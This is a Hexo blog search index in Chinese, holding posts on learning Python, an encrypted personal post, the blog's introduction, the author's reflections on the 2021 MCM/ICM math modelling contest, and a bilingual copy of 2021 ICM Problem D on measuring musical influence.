<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Python学习心得</title>
    <url>/2021/01/21/Python%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/</url>
    <content><![CDATA[<!-- excerpt --><br><!-- toc --></p>
<h3 id="学习书籍："><a href="#学习书籍：" class="headerlink" title="学习书籍："></a>学习书籍：<img src="/2021/01/21/Python%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/Python.png" alt="Python"></h3><p>&emsp;&emsp;该书籍比较适合python学习新手，讲解均为基础语法内容，全书分两部分：首部分介绍用Python 编程所必须了解的基本概念，包括变量、列表、字典、if语句、类、文件与异常、代码测试等内容；第二部分将理论付诸实践，讲解如何开发三个项目，包括简单的Python 2D游戏开发，如何利用数据生成交互式的信息图，以及创建和定制简单的Web应用，并帮读者解决常见编程问题和困惑。<br>&emsp;&emsp;全书目录如下：<br><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="strong">**第一部分 基础知识**</span></span><br><span class="line"> 第1章 起步 （环境搭建）</span><br><span class="line"> 第2章 变量和简单数据类型</span><br><span class="line"> 第3章 列表简介</span><br><span class="line"> 第4章 操作列表</span><br><span class="line"> 第5章 if语句</span><br><span class="line"> 第6章 字典</span><br><span class="line"> 第7章 用户输入和while循环</span><br><span class="line"> 第8章 函数</span><br><span class="line"> 第9章 类</span><br><span class="line"> 第10章 文件和异常</span><br><span class="line"> 第11章 测试代码</span><br><span class="line"> </span><br><span class="line"> <span class="strong">**第二部分 项目**</span></span><br><span class="line"> <span class="strong">**项目1 外星人入侵**</span></span><br><span class="line"> 第12章 武装飞船</span><br><span class="line"> 第13章 外星人</span><br><span class="line"> 第14章 计分</span><br><span class="line"> <span class="strong">**项目2 数据可视化**</span></span><br><span class="line"> 第15章 生产数据</span><br><span class="line"> 第16章 下载数据</span><br><span class="line"> 第17章 使用API</span><br><span class="line"> <span class="strong">**项目3 Web应用程序**</span></span><br><span class="line"> 第18章 Django入门</span><br><span class="line"> 第19章 用户账户</span><br><span class="line"> 第20章 设置应用程序的样式并对其进行部署</span><br><span class="line"> </span><br><span class="line"> 附录A 安装python</span><br><span class="line"> 附录B 文本编辑器</span><br><span class="line"> 附录C 寻求帮助</span><br><span class="line"> 附录D 使用Git进行版本控制</span><br></pre></td></tr></table></figure></p>
<h3 id="学习心得"><a href="#学习心得" class="headerlink" title="学习心得"></a>学习心得</h3><p> &emsp;&emsp;由于我之前学习过C语言，所以python学习很容易上手，python基本语法和C语言很类似。相比于C语言，python中添加了字典、类等，使用起来会更方便快捷，同时python语法更为简洁，调库即可解决很多问题，代码简洁凝练。<br>  &emsp;&emsp;我学习python是为以后的机器学习做准备，下一步目标是学习机器学习、神经网络相关内容。</p>]]></content>
      <categories>
        <category>学习心得</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>平安夜</title>
    <url>/2020/12/24/%E5%B9%B3%E5%AE%89%E5%A4%9C/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请重试." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="95ec9c315cd58359a4567fd3da94c797628e00f4eb7194f290ec2d44ab3a0768">5fe6c8a68ad5071aecbb46d073c337450b5cb98f9fa11c8b1e6729a1c45104fa91f9c33cdc3b859fa5fc2ebe46efd4a885c429b52d4a939a835a042cedb1eb76557bb252e1277ff8535b5719d6a4a87956249e77693fe57ff4e7e306ef335317859d7d23e7ce02ad9c53820d4371755ecb5ab51e65bf076470c056712fd5cd1049a7eb14cabf34fa023e28c4a398b07b25118b550c0bc78c42c72443b30b0fc7df21a3138c55422ee7b6b1c05547b6095d17490c0cc79dcd290927de472a5422212b6cc51ded5df9e3f17c3e0c1ff2fb9e9dc222e8e9c4cbc4cda9942a60e3b28b764cf9735430d208b9a29a7a9e0f2a4e486423606f3ea9c2935812edc6d3d5eb40025ef7f65af525029e31a6ad5b38f0d9ad1df45361b48218a117424718aac6f03204ca95b7b7e127578d970ffdda15ea4b6883eb8a093e551b94a8d9735ea73ea3e2be03dc449e3e7cf3033c8ee33c43df4a2f004eecc492b2bcbef1252994551e142b970c48c8381ec5f78ea6a61219cefad4355d1a7f9a77028a081ede1522e74080ccafe5cf61741e203bb7dd51977266f067d6c1f5e36897ba344ab846ebbe6fe31bd6f80078089c86329f747ea1eb7d14fb14fad6f27b9f66e55d0b0a30c5f06575d2dd2300a7273da8ad984073b9c1c623c7ae5ddeb125d1795caf09cef8055fac9fa34baf293e1a1575923b4aca60fbe668d72c919639bc8745d19a6f482c9fe57ac89f2686cfcaa72ce991c779af80f21ece56f341ed43dcb402bec8346572096e5c9e76ac46bacd20af99c787a98ad7b13b2fd7180d4ff733ee3a9f6b8f67161ba554f6f5260c4b83b02b3782c6722024b7aa3587996f0237c3d35fc929181953d35c3d1de05dc6595571f90146696a961fd46e73249b4f2aecee6344fc95224e6f73e48b3176e901580a9f78093e1e36141eaa94fa74212da4ac0c7d19ae4bd5bc9a06aa6841a01864fc65c1d893f6b0f258324c3282bb0ad5d390c9463447142a96888d049b1505c10f155b879416356393e2500171ac8c1ed62fad4c75d277e5d7f799d54974c2a8d7b1221ca5c7121ca0200880a8c417532b3b0b644a0c0da81222fade85ece8ed702ee1aa2768eea5cf3735a2de67d25890019ea676fc64ac3f28ad03ec0e8710de1f081b339497a9bcd0247561dd453f267486fc960d237a1acaff6845aace0b32046378b6f4a3f1146ef968f13386d6ca85118e73910570a0209aca4e60e82509337f06bfe03bb9d038a6026c8954b936b68b076b78d8ebb575aaffc81605879d42847b3d39822f6f071ae90fd7f16f1f1238cdce2df84700ecd4d6f4194d045c2353961f293141b501637a4513edec46b30cfa4823127702091285b603e2216fa07d5e6a8d9f10660cc76d8a47816d55cd5995c86036f29a4c1a901556e76c5171758d05092c8a7c002e6117c55ab074c7aa2b1df0e60f6b82eacc2a498b93c58ddfa4914c81c0a2a3b246db56ec35abb644630daa603a618e4eac1466a3cde268603e0504b6620b3ba8449fe324617ffcd8128f840538693480ac92abfe821464348405068bee1f22e7bd557972edb2ba29ec3f26697742f2f99796c292e1a9c86046094c8ab7932d1b7650148be8fc27e9b99d764e3fd27a5689b9fda42867cf0fbf297c49286d96c9e977027312</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码为我的出生年份</span>
      </label>
    </div>
  </div>
</div>
<script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>生活吐槽</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>置顶说明</title>
    <url>/2021/01/19/%E7%BD%AE%E9%A1%B6%E8%AF%B4%E6%98%8E/</url>
    <content><![CDATA[<!-- excerpt -->
<!-- toc -->
<h3 id="博客说明"><a href="#博客说明" class="headerlink" title="博客说明"></a>博客说明</h3><p>&emsp;&emsp;我是武汉大学在读本科生(2018年已毕业，现在在武大读研究生啦)，信息安全专业，该博客为我的个人博客，主要是记录学习过程中遇到的问题（计算机方面）和自己的生活。</p>
<h3 id="建博初衷"><a href="#建博初衷" class="headerlink" title="建博初衷"></a>建博初衷</h3><p>&emsp;&emsp;建立博客本是一时冲动。在学习烦躁时，我突然就有了申请域名的想法，还好申请个人域名价格也不算贵，所以就果断买了。有了域名仿佛就有了存在的证据，之后一个博客就顺其自然地出现了。<br>&emsp;&emsp;建立博客很快，照着各种教程马上就可以成型。但设计自己独立的风格很难，用了别人的博客主体还要自己一个个去修改，其中还需要一些前端js知识，对我这种前端小白来说还是很有难度的。<br>&emsp;&emsp;现在博客陆陆续续变得好看了起来，之后我会进一步完善。希望该博客可以成为我学习的动力，不断充实完善自己。</p>]]></content>
  </entry>
  <entry>
    <title>美赛参赛心得</title>
    <url>/2021/02/12/%E7%BE%8E%E8%B5%9B%E5%8F%82%E8%B5%9B%E5%BF%83%E5%BE%97/</url>
    <content><![CDATA[<!-- excerpt --><br><!-- toc --></p>
<h1 id="赛前准备"><a href="#赛前准备" class="headerlink" title="赛前准备"></a>赛前准备</h1><p>&emsp;&emsp;参加美赛实在是被迫的，都大三了，我还没有参加过任何竞赛，也没有得过奖，实在是很惭愧。又到了保研考研的季节，想通过竞赛冲一下，能得到加分更好了。所以咬咬牙想试一试。<br>&emsp;&emsp;赛前半个月我才开始组队，找到一个同学后就再也找不到队友了。本以为只有题目会让人绝望，组队竟然也是，怎么都找不到第三个队友。无奈最后就两个人参赛了，参赛费六七百，死贵还不说，还是我们两个人分。唉，而且两个人参赛工作量巨大。好在我们两个比较熟，参赛很容易沟通，这也是优点吧，还是挺感谢她的。<br>&emsp;&emsp;赛前十天左右，我开始学习相关模型和算法。当初在学校作业多，完全没有时间准备，现在只能十天速成。B站上有很多讲解视频，十分详细，很适合学习。还好美赛许多算法，如模拟退火、图论、最短路径、分治，专业课我都学习过，复习一下就好。其他的模型，如评价模型、优化模型、智能算法，原理很容易掌握，代码也能在网上找到。单纯使用的话没问题，但是参加比赛还是需要依据题目进行改进，并且要多练习。<br>&emsp;&emsp;关于论文和模板，赛前真的需要多看往年优秀论文，同时也要做一做往年题，不然实战真的很懵，呜呜呜。美赛是英文论文，看的头疼也要坚持看，太难了。<br>&emsp;&emsp;这里还是给了自己一个警醒，参加比赛前几个月一定要好好准备，不然完全吃不透，只能掌握大概。还有如果想获奖，还是需要努力了，没有那么简单的。</p>
<h1 id="赛中解题"><a href="#赛中解题" class="headerlink" title="赛中解题"></a>赛中解题</h1><p>&emsp;&emsp;2021年美赛于北京时间2月5号上午六点放题，一共ABCDEF六种题型，MCM是ABC三题，ICM是DEF三题，每种题型考察侧重点不同。题型一般为连续型、离散型、大数据、环境科学、政府政策、网络科学等。<br>&emsp;&emsp;看了两个小时英文原文后，初步选择D题。赛前我们是准备就选准C题的，因为C题给定数据，不用自己再找数据可能比较方便。然而今年C题关于黄蜂，需要自然语言处理和图像处理，感觉难度挺大，而D题也给了数据，都是Excel表格，数据类型单一，比较好处理。<br>&emsp;&emsp;D题就是关于图论的问题，给了四个Excel表格，记录了一个音乐家受到了哪几个音乐家影响，一个歌曲的各种特征等。然后根据所给数据分析音乐家之间的影响关系和相似度。<br>&emsp;&emsp;D题原文及翻译链接如下：<a href="https://yiwenzhe.com/2021/02/12/2021%E7%BE%8E%E8%B5%9BD%E9%A2%98" target="_blank">2021美赛D题</a><br>&emsp;&emsp;拿到题目就是几天没日没夜的解题了。每天睡六七个小时，然后娱乐时间都没有。每天明明起得早睡得晚，但我还是很有精神，应该是注意力很集中吧，每天都有具体的工作，这样就不会犯困了。</p>
<h1 id="赛后提交"><a href="#赛后提交" class="headerlink" title="赛后提交"></a>赛后提交</h1><p>&emsp;&emsp;从2月5号早上6点开始一直到忙到2月9号早上6点提交，最后一天甚至通宵写论文（有一说一论文真的不好写）。赛前看的论文不多，所以最后写的时候还要一个个调格式，仿照往年优秀论文的写法，最后的summary需要写的简洁凝练。写论文总共花了一天时间，毕竟是全英文论文，写完也要一句句检查，订正语法错误和拼写错误。建议多留出时间写论文和修改。<br>&emsp;&emsp;2021美赛截止时间是北京时间9号早上9点，这里还发生了一个小插曲。我们6点提交，比最后提交时间早三个小时，不到五分钟官方那边就收到了。反而他们后面八九点提交时，官方服务器坏了，所以很多被退信。好在最后官方延长提交时间，解决了这一问题。但还是提醒我们，很多比赛，尤其是国外的，要记得提前交，不要拖到最后一刻。最后提交人很多，经常会出现服务器崩溃的问题。</p>
<h1 id="赛后反思"><a href="#赛后反思" class="headerlink" title="赛后反思"></a>赛后反思</h1><p>&emsp;&emsp;提交完真的是松了一口气，终于可以放松了，这几天忙的累死了。每天固定时间起床，晚上12点或者1点才睡。起来就是解题，注意力从来没有这么集中过，真的很考验人。<br>&emsp;&emsp;美赛还是很难的，感觉这次可能只是做慈善送钱了，获奖应该没有希望吧。准备最多才十天，真的没有准备好，临阵磨枪还是不太行。而且这种限时的比赛很考验耐力，我是不太行，不想参加第二次了。还是那种限时几个月提交作品的比赛适合我，唉，还是自己能力不行。<br>&emsp;&emsp;这几天参赛很感谢我的队友，只有我们两个还是能把这个题目做完，不论结果好坏，我们都是用了心的。她的工作量可能比我还大，她写作比较好，论文比较重要的部分都交给了她，她是真的很努力很用心，花几个小时去打磨一段话，最后summary写的很棒。比赛有一个靠谱努力的队友真的很重要。感谢你，这次比赛我们都付出了很多。希望下次能继续合作。</p>]]></content>
      <categories>
        <category>学习心得</category>
      </categories>
      <tags>
        <tag>美赛</tag>
      </tags>
  </entry>
  <entry>
    <title>2021美赛D题</title>
    <url>/2021/02/12/2021%E7%BE%8E%E8%B5%9BD%E9%A2%98/</url>
    <content><![CDATA[<!-- excerpt --><br><!-- toc --></p>
<h1 id="中文翻译："><a href="#中文翻译：" class="headerlink" title="中文翻译："></a>中文翻译：</h1><p><strong>问题D：音乐的影响</strong></p>
<p>自古以来，音乐就已成为人类社会的一部分，已成为文化遗产的重要组成部分。为了理解音乐在人类集体经验中所扮演的角色，我们被要求开发一种量化音乐发展的方法。在创作新音乐时，有许多因素会影响艺术家，包括其天赋的创造力，当前的社会或政治事件，使用新乐器或工具的机会或其他个人经历。我们的目标是了解和衡量先前制作的音乐对新音乐和音乐艺术家的影响。</p>
<p>一些艺术家可以列出十几个或更多他们认为对自己的音乐作品有影响的艺术家。还建议可以通过歌曲特征（例如结构，节奏或歌词）之间的相似程度来衡量影响力。音乐有时会发生革命性的变化，提供新的声音或节奏，例如何时出现新的流派，或者对现有流派（例如古典，流行/摇滚，爵士等）进行重新发明。这可能是由于一系列小变化，艺术家的合作努力，一系列有影响力的艺术家或社会内部的变化所致。</p>
<p>许多歌曲具有相似的声音，许多艺术家为音乐类型的重大转变做出了贡献。有时，这些变化是由于一位艺术家影响了另一位艺术家。有时，这是对外部事件（例如重大世界事件或技术进步）的响应而出现的变化。通过考虑歌曲的网络及其音乐特征，我们可以开始捕捉音乐艺术家之间的相互影响。而且，也许，我们还可以更好地了解音乐随着时间的流逝在整个社会中的发展。</p>
<p>集成集体音乐协会（ICM）指定了您的团队，来开发一种衡量音乐影响力的模型。这个问题要求您探求艺术家和流派的进化和革命趋势。为此，ICM为您的团队提供了一些数据集：</p>
<ol>
<li>“influence_data”代表艺术家自己报告的音乐影响者和追随者，以及行业专家的意见。这些数据包含过去90年中5,854位艺术家的影响者和关注者。</li>
<li><p>“full_music_data”提供了16个变量项，包括音乐特征（如舞蹈性，速度，响度和音律），以及98,340首歌曲中的每一个的artist_name（艺术家名字）和artist_id（艺术家id）。这些数据用于创建两个摘要数据集，包括：</p>
<p>a.按照艺术家的平均值“data_by_artist”<br>b.按照年份的平均值“data_by_year”</p>
</li>
</ol>
<p><strong>注意：这些文件中提供的数据是较大数据集的子集。这些文件包含您应为该问题使用的唯一数据。</strong></p>
<p>为了执行这个具有挑战性的项目，ICM协会要求您的团队通过以下措施，通过音乐艺术家随时间的影响来探索音乐的发展：</p>
<ul>
<li><p>使用influence_data数据集或其中的一部分来创建音乐影响力的（多个）定向网络，将影响者连接到追随者。开发可捕获此网络中“音乐影响力”的参数。通过创建定向影响者网络的子网来探索音乐影响力的子集。描述此子网。您的“音乐影响力”措施在此子网络中体现了什么？</p>
</li>
<li><p>使用音乐特征的full_music_data和/或两个摘要数据集（包括艺术家和年份）来制定音乐相似度的度量。使用您的度量，流派内的艺术家是否比流派间的艺术家更相似？</p>
</li>
<li><p>比较流派之间和流派之间的相似性和影响。什么是流派的区别，流派如何随时间变化？有些类型与其他类型有关吗？</p>
</li>
<li><p>指示data_influence数据集中报告的相似性数据是否表明所标识的影响者实际上在影响相应的艺术家。 “影响者”实际上会影响追随者创作的音乐吗？是某些音乐特征比其他音乐特征更具“感染力”，或者它们在影响特定艺术家的音乐方面起着相似的作用？</p>
</li>
<li><p>从这些数据中确定是否存在可能标志着音乐发展中的革命（重大飞跃）的特征？在您的网络中，哪些艺术家代表着革命者（重大变革的影响者）？</p>
</li>
<li><p>分析一种类型音乐随时间变化的影响过程。您的团队能否确定能揭示动态影响者的指标，并解释流派或艺术家随时间的变化？</p>
</li>
<li><p>您的作品如何表达有关音乐在时间或环境方面的文化影响的信息？或者，如何在网络中识别社会，政治或技术变化（例如互联网）的影响？</p>
</li>
</ul>
<p>向ICM协会写一份一页纸的文件，说明使用您的方法通过网络理解音乐影响的价值。考虑到这两个问题数据集仅限于某些类型，然后又针对这两个数据集共有的艺术家，您的作品或解决方案将如何随着更多或更丰富的数据而发生变化？建议进一步研究音乐及其对文化的影响。</p>
<p>来自音乐，历史，社会科学，技术和数学领域的跨学科，多元化的ICM协会期待您的最终报告。</p>
<p>您的PDF解决方案（总共不超过25页）应包括：</p>
<ul>
<li>一页的摘要表。</li>
<li>目录。</li>
<li>您的完整解决方案。</li>
<li>对ICM协会的一页文件。</li>
<li>参考文献清单。</li>
</ul>
<p><strong>注意：2021年的新要求！现在，ICM竞赛限制为25页。提交的所有方面均计为25页的限制：摘要表，目录，解决方案主体，图像和表格，一页文档，参考列表和任何附录。</strong></p>
<p><strong>附件</strong><br>针对此问题，我们提供了以下四个数据文件。提供的数据文件包含您应用于此问题的唯一数据。</p>
<ol>
<li>influence_data.csv</li>
<li>full_music_data.csv</li>
<li>data_by_artist.csv</li>
<li>data_by_year.csv</li>
</ol>
<p><strong>数据描述</strong></p>
<ol>
<li><p><strong>influence_data.csv</strong>（数据以utf-8编码，以允许处理特殊字符）</p>
<ul>
<li><strong>influence_id</strong>：给列出为影响者的人的唯一编号。 （数字字符串）</li>
<li><strong>influence_name</strong>：影响者的名称，由关注者或行业专家提供。 （串）</li>
<li><strong>influence_main_genre</strong>：最能描述有影响力的艺术家创作的大部分音乐的流派。 （如果有）（字符串）</li>
<li><strong>influence_active_start</strong>：影响力艺术家开始其音乐事业的十年。 （整数）</li>
<li><strong>follower_id</strong>：提供给列出为关注者的艺术家的唯一编号。 （数字字符串）</li>
<li><strong>follower_name</strong>：跟随有影响力的艺术家的艺术家的名字。 （串）</li>
<li><strong>follower_main_genre</strong>：最能描述以下艺术家创作的大部分音乐的流派。 （如果有）（字符串）</li>
<li><strong>follower_active_start</strong>：以下艺术家开始音乐生涯的十年。 （整数）</li>
</ul>
</li>
<li><p><strong>full_music_data.csv</strong> </p>
</li>
<li><strong>data_by_artist.csv</strong></li>
<li><strong>data_by_year.csv</strong></li>
</ol>
<p>“full_music_data”, “data_by_artist”, “data_by_year”三个表中的音乐特征：</p>
<ul>
<li>artist_name: 创造歌曲的艺术家。（数组）</li>
<li>artist_id: 和influence_data.csv文件中相同的艺术家唯一编号。 （数字字符串）</li>
</ul>
<p><strong>音乐特征：</strong></p>
<ul>
<li>danceability: 根据节奏，节奏稳定性，拍子强度和整体规律性等音乐元素的组合来衡量轨道适合跳舞的方式。值0.0为最低可跳舞能力，而1.0为最高可跳舞能力。 （浮点数）</li>
<li>energy: 表示对强度和活动的感知的量度。值0.0为最小强度/能量，而1.0为强度最大/能量。通常，充满活力的曲目会让人感到快速，响亮且嘈杂。例如，死亡金属具有较高的能量，而巴赫前奏的得分则较低。有助于此属性的感知特征包括动态范围，感知的响度，音色，发作率和一般熵。 （浮点数）</li>
<li>valence: 一种描述曲目传达的音乐积极性的量度。值0.0最消极，1.0最积极。价态高的音轨听起来更积极（例如，快乐，开朗，欣快），而价态低的音轨听起来更负面（例如，悲伤，沮丧，愤怒）。 （浮点数）</li>
<li>tempo: 曲目的总体估计拍速，以每分钟拍数（BPM）为单位。用音乐术语来说，节奏是指给定乐曲的速度或节奏，它直接来自平均拍子持续时间。 （浮点数）</li>
<li>loudness: 轨道的整体响度，以分贝（dB）为单位。值的典型范围是-60至0 db。响度值是整个轨道的平均值，可用于比较轨道的相对响度。响度是声音的质量，它是身体力量（振幅）的主要心理关联。 （浮点数）</li>
<li>mode: 音轨的模态（主要或次要）的指示，其旋律内容所源自的音阶类型。 Major用1表示，minor用0表示。</li>
<li>key: 曲目的估计总体密钥。整数使用标准音高类别符号映射到音高。例如。 0 = C，1 =C♯/ D♭，2 = D，依此类推。如果未检测到密钥，则密钥的值为-1。 （整数）</li>
</ul>
<p><strong>人声类型</strong></p>
<ul>
<li>acousticness: 磁道是否是声学的置信度度量（不增强技术或增强电性能）。值1.0表示轨道是声学的高置信度。 （浮点数）</li>
<li>instrumentalness: 预测曲目是否不包含人声。在这种情况下，“哦”和“啊”的声音被视为乐器。说唱或口语单词轨迹显然是“声音”。器乐性值越接近1.0，则曲目中没有人声内容的可能性越大。高于0.5的值旨在表示乐器音轨，但随着该值接近1.0，置信度更高。 （浮点数）</li>
<li>liveness: 检测曲目中观众的存在。较高的活跃度值表示增加了实时执行轨道的可能性。高于0.8的值很可能会显示该轨道处于活动状态。 （浮点数）</li>
<li>speechiness: 检测曲目中口语的存在。与录音类似的语音内容（例如脱口秀，有声读物，诗歌）越多，属性值就越接近1.0。大于0.66的值描述的曲目可能完全由口语组成。介于0.33到0.66之间的值描述了可能同时包含音乐和语音的曲目，无论是分段还是分层的（包括说唱音乐）。低于0.33的值最有可能代表音乐和其他非语音类曲目。 （浮点数）</li>
<li>explicit: 检测曲目中的脏话（true（1）=有； false（0）= 没有，或者未知）。 （布尔值）</li>
</ul>
<p><strong>描述</strong></p>
<ul>
<li>duration_ms: 轨道的持续时间（以毫秒为单位）。 （整数）</li>
<li>popularity: 这首歌的受欢迎程度。该值将在0到100之间，其中100是最受欢迎的值。受欢迎程度是通过算法计算的，并且在很大程度上取决于音轨的总播放次数以及这些播放的最近时间。一般而言，现在播放频率更高的歌曲将比过去播放频率更高的歌曲具有更高的知名度。重复曲目（例如，同一首曲目和一张专辑中的同一曲目）将被独立评估。艺术家和专辑的流行度是从曲目流行度中数学得出的。 （整数）</li>
<li>year: 发行曲目的年份。 （1921年至2020年的整数）</li>
<li>release_date: 曲目发布的日历日期，大多数采用yyyy-mm-dd格式，但是日期的精度可能会有所不同，有些只是以yyyy给出。</li>
<li>song_title (censored): 曲目的名称。 （字符串）已运行软件以删除歌曲标题中的任何潜在脏话单词。</li>
<li>count: full_music_data.csv文件中表示特定艺术家的歌曲数。 （整数）</li>
</ul>
<h1 id="英文原文："><a href="#英文原文：" class="headerlink" title="英文原文："></a>英文原文：</h1><p><strong>2021 ICM<br>Problem D: The Influence of Music</strong></p>
<p>Music has been part of human societies since the beginning of time as an essential component of cultural heritage. As part of an effort to understand the role music has played in the collective human experience, we have been asked to develop a method to quantify musical evolution. There are many factors that can influence artists when they create a new piece of music, including their innate ingenuity, current social or political events, access to new instruments or tools, or other personal experiences. Our goal is to understand and measure the influence of previously produced music on new music and musical artists.</p>
<p>Some artists can list a dozen or more other artists who they say influenced their own musical work. It has also been suggested that influence can be measured by the degree of similarity between song characteristics, such as structure, rhythm, or lyrics. There are sometimes revolutionary shifts in music, offering new sounds or tempos, such as when a new genre emerges, or there is a reinvention of an existing genre (e.g. classical, pop/rock, jazz, etc.). This can be due to a sequence of small changes, a cooperative effort of artists, a series of influential artists, or a shift within society.</p>
<p>Many songs have similar sounds, and many artists have contributed to major shifts in a musical genre. Sometimes these shifts are due to one artist influencing another. Sometimes it is a change that emerges in response to external events (such as major world events or technological advances). By considering networks of songs and their musical characteristics, we can begin to capture the influence that musical artists have on each other. And, perhaps, we can also gain a better understanding of how music evolves through societies over time.</p>
<p>Your team has been identified by the <strong>Integrative Collective Music (ICM) Society</strong> to develop a model that measures musical influence. This problem asks you to examine evolutionary and revolutionary trends of artists and genres. To do this, your team has been given several data sets by the ICM:<br>1) “influence_data” represents musical influencers and followers, as reported by the artists themselves, as well as the opinions of industry experts. These data contains influencers and followers for 5,854 artists in the last 90 years.<br>2) “full_music_data” provides 16 variable entries, including musical features such as danceability, tempo, loudness, and key, along with artist_name and artist_id for each of 98,340 songs. These data are used to create two summary data sets, including:<br>    a. mean values by artist “data_by_artist”,<br>    b. means across years “data_by_year”.</p>
<p><strong>Note:</strong> DATA provided in these files are a subset of larger data sets. These files <strong>CONTAIN THE ONLY DATA YOU SHOULD USE FOR THIS PROBLEM</strong>.</p>
<p>To carry out this challenging project, the ICM Society asks your teams to explore the evolution of music through the influence across musical artists over time, by doing the following:</p>
<ul>
<li>Use the <em>influence_data</em> data set or portions of it to create a (multiple) directed network(s) of musical influence, where influencers are connected to followers. Develop parameters that capture ‘<em>music influence</em>’ in this network. Explore a subset of musical influence by creating a subnetwork of your directed influencer network. Describe this subnetwork. What do your ‘music influence’ measures reveal in this subnetwork?</li>
<li>Use <em>full_music_data</em> and/or the two summary data sets (with artists and years) of music characteristics, to develop measures of music similarity. Using your measure, are artists within genre more similar than artists between genres?</li>
<li>Compare similarities and influences between and within genres. What distinguishes a genre and how do genres change over time? Are some genres related to others?</li>
<li>Indicate whether the similarity data, as reported in the data_influence data set, suggest that the identified influencers in fact influence the respective artists. Do the ‘influencers’ actually affect the music created by the followers? Are some music characteristics more ‘contagious’ than others, or do they all have similar roles in influencing a particular artist’s music?</li>
<li>Identify if there are characteristics that might signify revolutions (major leaps) in musical evolution from these data? What artists represent revolutionaries (influencers of major change) in your network?</li>
<li>Analyze the influence processes of musical evolution that occurred over time in one genre. Can your team identify indicators that reveal the dynamic influencers, and explain how the genre(s) or artist(s) changed over time?</li>
<li>How does your work express information about cultural influence of music in time or circumstances? Alternatively, how can the effects of social, political or technological changes (such as the internet) be identified within the network?</li>
</ul>
<p>Write a <strong>one-page document</strong> to the ICM Society about the value of using your approach to understanding the influence of music through networks. Considering the two problem data sets were limited to only some genres, and subsequently to those artists common to both data sets, how would your work or solutions change with more or richer data? Recommend further study of music and its effect on culture.</p>
<p>The ICM Society, an interdisciplinary and diverse group from the fields of music, history, social science, technology, and mathematics, looks forward to your final report.</p>
<p>Your PDF solution of no more than 25 total pages should include:</p>
<ul>
<li>One-page Summary Sheet.</li>
<li>Table of Contents.</li>
<li>Your complete solution.</li>
<li>One-page document to ICM society.</li>
<li>References list.</li>
</ul>
<p><strong>Note: New for 2021!</strong> The ICM Contest now has a <strong>25-page limit</strong>. All aspects of your submission count toward the 25-page limit: Summary Sheet, Table of Contents, Main Body of Solution, Images and Tables, One-page Document, Reference List, and any Appendices.</p>
<p><strong>Attachments</strong><br>We provide the following four data files for this problem. THE DATA FILES PROVIDED CONTAIN THE ONLY DATA YOU SHOULD USE FOR THIS PROBLEM.</p>
<ol>
<li><strong>influence_data.csv</strong></li>
<li><strong>full_music_data.csv</strong></li>
<li><strong>data_by_artist.csv</strong></li>
<li><strong>data_by_year.csv</strong></li>
</ol>
<p><strong>Data Descriptions</strong></p>
<ol>
<li><strong>influence_data.csv</strong> (Data is encoded in utf-8 to allow for handling of special characters):<ul>
<li><strong>influencer_id</strong>: A unique identification number given to the person listed as influencer. (string of digits)</li>
<li><strong>influencer_name</strong>: The name of the influencing artist as given by the follower or industry experts. (string)</li>
<li><strong>influencer_main_genre</strong>: The genre that best describes the bulk of the music produced by the influencing artist. (if available) (string)</li>
<li><strong>influencer_active_start</strong>: The decade that the influencing artist began their music career. (integer)</li>
<li><strong>follower_id</strong>: A unique identification number given to the artist listed as follower. (string of digits)</li>
<li><strong>follower_name</strong>: The name of the artist following an influencing artist. (string)</li>
<li><strong>follower_main_genre</strong>: The genre that best describes the bulk of the music produced by the following artist. (if available) (string)</li>
<li><strong>follower_active_start</strong>: The decade that the following artist began their music career. (integer)</li>
</ul>
</li>
<li><strong>full_music_data.csv</strong></li>
<li><strong>data_by_artist.csv</strong></li>
<li><strong>data_by_year.csv</strong></li>
</ol>
<p>Spotify audio features from the “<strong>full_music_data</strong>”, “<strong>data_by_artist</strong>”, “<strong>data_by_year</strong>”:</p>
<ul>
<li><strong>artist_name</strong>: The artist who performed the track. (array)</li>
<li><strong>artist_id</strong>: The same unique identification number given in the influence_data.csv file. (string of digits)</li>
</ul>
<p><strong>Characteristics of the music:</strong></p>
<ul>
<li><strong>danceability</strong>: A measure of how suitable a track is for dancing based on a combination of musical elements including tempo, rhythm stability, beat strength, and overall regularity. A value of 0.0 is least danceable and 1.0 is most danceable. (float)</li>
<li><strong>energy</strong>: A measure representing a perception of intensity and activity. A value of 0.0 is least intense/energetic and 1.0 is most intense/energetic. Typically, energetic tracks feel fast, loud, and noisy. For example, death metal has high energy, while a Bach prelude scores low on the scale. Perceptual features contributing to this attribute include dynamic range, perceived loudness, timbre, onset rate, and general entropy. (float)</li>
<li><strong>valence</strong>: A measure describing the musical positiveness conveyed by a track. A value of 0.0 is most negative and 1.0 is most positive. Tracks with high valence sound more positive (e.g. happy, cheerful, euphoric), while tracks with low valence sound more negative (e.g. sad, depressed, angry). (float)</li>
<li><strong>tempo</strong>: The overall estimated tempo of a track in beats per minute (BPM). In musical terminology, tempo is the speed or pace of a given piece and derives directly from the average beat duration. (float)</li>
<li><strong>loudness</strong>: The overall loudness of a track in decibels (dB). Values typical range between -60 and 0 db. Loudness values are averaged across the entire track and are useful for comparing relative loudness of tracks. Loudness is the quality of a sound that is the primary psychological correlate of physical strength (amplitude). (float)</li>
<li><strong>mode</strong>: An indication of modality (major or minor), the type of scale from which its melodic content is derived, of a track. Major is represented by 1 and minor is 0.</li>
<li><strong>key</strong>: The estimated overall key of the track. Integers map to pitches using standard Pitch Class notation. E.g. 0 = C, 1 = C♯/D♭, 2 = D, and so on. If no key was detected, the value for key is -1. (integer)</li>
</ul>
<p><strong>Type of vocals:</strong></p>
<ul>
